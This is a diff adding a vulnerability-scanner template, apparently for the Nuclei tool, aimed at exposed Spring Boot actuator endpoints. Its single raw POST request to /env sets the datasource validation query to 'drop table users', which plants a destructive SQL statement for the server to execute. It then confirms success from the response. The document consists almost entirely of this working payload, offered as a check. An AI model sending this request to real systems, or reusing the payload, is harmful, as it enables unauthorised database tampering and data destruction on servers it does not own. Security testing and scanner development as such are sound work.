@@ -1,0 +1,36 @@
+id: spring-boot-actuators-sqli
+
+info:
+  name: Spring Boot Actuators - SQLi
+  author: Akincibor
+  severity: high
+  description: |
+    A misconfiguration allows you to specify any SQL query, and it will be automatically executed against the current database. It could be any statement, including insert, update, or delete.
+  reference:
+    - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+  tags: sqli,springboot
+
+requests:
+  - raw:
+      - |
+        POST /env HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        spring.datasource.tomcat.validationQuery=drop+table+users
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"spring.datasource.tomcat.validationQuery":"drop table users"}'
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
